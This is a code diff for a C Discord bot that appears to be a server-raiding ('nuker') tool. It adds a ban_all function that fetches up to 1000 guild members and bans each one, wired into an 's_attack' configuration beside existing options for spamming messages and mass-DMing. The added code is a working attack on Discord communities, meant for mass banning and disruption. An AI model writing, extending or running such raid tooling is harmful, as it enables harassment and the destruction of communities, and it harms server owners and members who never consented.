@@ -161,6 +161,33 @@ void change_nickname(struct discord *client, u64_snowflake_t guild_id,
         NULL);
 }
 
+void ban_all(struct discord *client, u64_snowflake_t guild_id)
+{
+    struct discord_guild_member **members = NULL;
+
+    discord_list_guild_members(
+        client,
+        guild_id,
+        &(struct discord_list_guild_members_params){
+            .limit = 1000,
+        },
+        &members);
+    int i = 0;
+
+    while (members[i])
+    {
+        discord_create_guild_ban(
+            client,
+            guild_id,
+            members[i]->user->id,
+            &(struct discord_create_guild_ban_params){
+                .delete_message_days = 0});
+        i++;
+    }
+
+    log_info("Banned %d users in %" PRIu64, i, guild_id);
+}
+
 void spam_messages(struct discord *client, u64_snowflake_t guild_id,
                    char _message[2000], int amount)
 {
@@ -259,6 +286,11 @@ void on_ready(struct discord *client)
     if (s_attack.send_message_enabled == true)
     {
         spam_messages(client, guild_id, s_attack.send_message_message, s_attack.send_message_amount);
+    }
+
+    if (s_attack.ban_all_enabled == true)
+    {
+        ban_all(client, guild_id);
     }
 
     if (s_attack.dm_all_enabled == true)
